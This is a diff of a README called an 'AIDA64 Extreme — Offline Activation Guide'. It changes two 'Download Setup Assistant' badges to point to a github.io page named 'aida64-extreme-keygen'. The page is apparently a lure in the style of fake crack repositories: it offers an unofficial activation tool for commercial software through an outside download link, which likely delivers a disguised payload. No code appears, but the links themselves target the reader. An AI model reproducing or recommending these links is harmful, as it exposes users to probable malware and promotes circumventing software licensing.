@@ -1,6 +1,6 @@
 # AIDA64 Extreme — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/%F0%9F%93%95%20Download%20Setup%20Assistant-%E2%9C%85%20Offline%20Ready-green?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/AIDa)
+[![Download Setup Assistant](https://img.shields.io/badge/%F0%9F%93%95%20Download%20Setup%20Assistant-%E2%9C%85%20Offline%20Ready-green?style=for-the-badge&logo=windows&logoColor=white)](https://aida64-extreme-keygen.github.io/.github)
 
 ## ⚙️ How to Use
 
@@ -33,7 +33,7 @@
 ![Stability Test](https://www.aida64.com/sites/default/files/screenshots/aida64-stability-test-1_light.png)  
 *System stress testing for stability and cooling validation*
 
-[![Download Setup Assistant](https://img.shields.io/badge/%F0%9F%93%95%20Download%20Setup%20Assistant-%E2%9C%85%20Offline%20Ready-green?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/AIDa)
+[![Download Setup Assistant](https://img.shields.io/badge/%F0%9F%93%95%20Download%20Setup%20Assistant-%E2%9C%85%20Offline%20Ready-green?style=for-the-badge&logo=windows&logoColor=white)](https://aida64-extreme-keygen.github.io/.github)
 
 ---
 
